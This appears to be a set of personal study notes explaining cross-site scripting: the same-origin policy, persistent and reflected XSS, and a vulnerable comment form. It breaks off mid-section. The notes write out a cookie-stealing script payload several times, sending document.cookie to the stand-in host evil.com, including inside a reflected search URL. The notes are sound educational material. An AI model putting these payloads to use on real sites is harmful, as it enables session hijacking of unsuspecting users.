# XSS
XSS is a code injection attack which allows the attacker to execute malicious JAVASCRIPT in another user's browser

- JS is a client side scripting  language where code runs in your browser
- JS can be written inside HTML files inside HTML <script> tag
- Code within this <script> tags is executed in the context of the site

The web's security model is based on the same origin policy
Origin refers to the combination of 
- 1 The url scheme eg http or https
- 2 the hostname e.g google
- 3 the port number, typically 80 for public sites

- This basically means that code (HTML, CSS, JS) from http://somesite.com can only access the data of http://somesite.com
which means that in theory http://evil.com cannot access data from any site other than http://evil.com!
- The key thing here is how do we define code from http://somesite.com.
- This is HTML, CSS , JS which served from that server
- XSS is all about making the browser believe that malicious code came from a trusted site!

- JS runs in a very restricted environment on your browser and it has limited access to that user's operating system and files
- Access cookies which usually contain session information - this can be used to impersonate a user
- send XmlHTTP Requests with any content to any destination
- Edit the DOM of the current website to anything it wants
- JS in modern HTML5 browsers can access the user's geolocation, webcam, certianfiles on user computer
- Remember all this while you believe that you are ona trusted site
- combining the capability of JS and socail engineering hacker can steel a lot.

Phising can happen with this
- Insert a form into DOM of the trusted page and direct the results to be submitted to the attackers server

http://excess-xss.com - great resource to learn all about XSS

#### Example
- 3 actors in XSS attack = Attacker, website, victim
Attacker
- XSS attack targets website not a specific user
- Any user of that website can be compromised
- Name of attacker's website http://www.evil.com
- Attacker seeks: Access to victim's session ID sent via cookies
- script attacker wants to inject
```javascript
<script> 
window.location="http://www.evil.com/?cookie="+document.cookie;
</script>
```
- the cookie information from the current site is apssed as a query parameter to the malicious site.
- evil site can record this info and use it in further attacks.
Website
- name of trusted website: http://www.trustedsite.com
- the website is vulnerable to XSS attacks
Victim
- any user of the trusted website
- willing to handover sensitive information to the site
- so how can the attacker inject this script into a trusted website? = unvalidated and unsanitized user input

Scenario
- lets say the trusted site allows users to input comments - on anything
<input> name
<textbox> comment
 <button> submit
- the forum page on the trusted site displays all comments which have been added.
- whatever the users write the exact same comment without modifications is shown.
- Now attacker came to trusted site and he entered comment as below and hit submit button
   ```javascript
<script> 
window.location="http://www.evil.com/?cookie="+document.cookie;
</script>
``` 
- Now, this input is written directly to the websites comment database(user input has not cleaned in anyway (UNVALIDATED & UNSANITIZED USER INPUT).
- Now our victim visits the comments page of the trusted site
- Boom !!  so what just happened? = victims session ID has gone to evil.com

### Types of XSS
3 types
- 1 Persistent XSS
- 2 Reflected XSS
- 3 DOM Based XSS

##### Persistent XSS
- The malicious script originates from the website's database
- the injected <script> has been persisted amongst other valid data in the website's storage.
- The comment exaple we just saw is Persistent XSS

##### Reflected XSS
- the malicious script is part of the victims request to the website.
- the website then reflects this string back to victim.
lets say the website is a serach page which displays the search query to screen along with the results (like google search)
- eg: you searhced for cute puppies.
- The search term has been rendered on the screen
- ``` http://www.trustedsearch.com?query=cute puppies ```
- this would initiate the search on the servers and return results to the user
- Attacker sends a link chekout the cute puppies on this page where 'this' is hyperlinked to 
``` http://www.trustedsearch.com?query=<script> 
window.location="http://www.evil.com/?cookie="+document.cookie;
</script> ```

The victim

   
   
   




